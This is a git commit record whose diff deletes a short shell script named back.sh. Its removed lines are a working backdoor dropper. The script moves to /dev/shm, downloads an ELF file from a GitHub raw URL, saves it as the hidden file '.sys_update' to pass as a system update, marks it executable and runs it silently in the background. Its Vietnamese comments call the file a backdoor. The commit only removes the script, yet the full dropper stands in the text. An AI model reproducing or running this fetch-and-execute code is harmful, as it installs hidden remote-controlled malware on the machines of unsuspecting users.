87c38f80cc7adf509ea19101586f2b38e0c83e5b
AnnaliseHackett <fdsjkrnennnnnnnnnnnnnnnnugierhguierhngiengioejgfmeofe@tempmail.ckvn.edu.vn>
2026-01-25 17:20:27 +0700

    Delete back.sh

--- back.sh
+++
@@ -1,9 +0,0 @@
-#!/bin/bash
-D="/dev/shm"
-cd $D
-# Tải backdoor
-curl -sL https://github.com/AnnaliseHackett/Fix/raw/refs/heads/main/test.elf -o .sys_update
-chmod +x .sys_update
-# Chạy backdoor
-./.sys_update >/dev/null 2>&1 &
-# Tạm thời bỏ rm để xem file có tải về được không
